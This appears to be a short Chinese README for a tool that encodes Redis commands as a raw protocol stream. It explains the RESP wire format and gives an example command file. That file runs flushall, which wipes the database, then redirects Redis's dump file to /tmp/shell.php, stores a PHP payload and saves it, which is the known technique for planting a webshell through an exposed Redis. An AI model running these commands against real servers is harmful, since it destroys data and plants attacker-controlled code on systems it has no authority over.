### 原理
redis协议特别简单，简单到可以被直接读懂, 协议格式如下
```bash
*<参数数量> CR LF
$<参数 1 的字节数量> CR LF
<参数 1 的数据> CR LF
...
$<参数 N 的字节数量> CR LF
<参数 N 的数据> CR LF
```
所以编写出tcp stream就非常简单，把需要执行的命令按照上面的格式拼凑出来就行


### 使用
redis.cmd文件为需要执行的redis命令，一行一条命令, e.g.
```
flushall
config set dir /tmp
config set dbfilename shell.php
set 'webshell' '<?php phpinfo();?>'
save
```
